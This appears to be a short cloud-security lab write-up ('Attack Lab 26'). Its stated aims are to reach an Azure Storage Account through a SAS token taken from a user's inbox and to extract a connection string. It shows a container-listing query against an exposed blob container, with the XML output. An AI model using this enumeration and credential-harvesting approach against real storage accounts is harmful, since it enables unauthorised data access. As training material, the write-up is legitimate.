# Attack Lab 26


```
− Gain access to a Storage Account by leveraging SAS Token by leveraging the information extracted from the inbox of Marie Williams.
− Read the Source Code of the Function App from the Azure Files and extract the connection string for Storage Account.
```

Try to access to the email link found on Marie email:

```
Dear Marie,

Your documents are uploaded and approved. You can find the documents here - https://billingprocessorstg.blob.core.windows.net/mariewilliams

In case of any changes, please upload the documents again and submit a new request.


Regards,
```
Web access:
```
<Error>
<Code>ResourceNotFound</Code>
<Message>The specified resource does not exist. RequestId:f0bab61d-501e-0012-22b5-fd1bc6000000 Time:2023-10-13T09:15:08.8791151Z</Message>
</Error>
```
With additional querystring parameters:

```
https://billingprocessorstg.blob.core.windows.net/mariewilliams?restype=container&comp=list
```
Response
```
This XML file does not appear to have any style information associated with it. The document tree is shown below.
<EnumerationResults ContainerName="https://billingprocessorstg.blob.core.windows.net/mariewilliams">
<Blobs>
<Blob>
<Name>mapped.xml</Name>
<Url>https://billingprocessorstg.blob.core.windows.net/mariewilliams/mapped.xml</Url>
<Properties>
<Last-Modified>Wed, 11 Oct 2023 11:20:39 GMT</Last-Modified>
<Etag>0x8DBCA4C199BB41B</Etag>
<Content-Length>411</Content-Length>
<Content-Type>text/xml</Content-Type>
<Content-Encoding/>
<Content-Language/>
<Content-MD5>1Rbf9T4TjgxZDumuVadM2w==</Content-MD5>
<Cache-Control/>
<BlobType>BlockBlob</BlobType>
<LeaseStatus>unlocked</LeaseStatus>
</Properties>
</Blob>
</Blobs>
<NextMarker/>
</EnumerationResults>
```
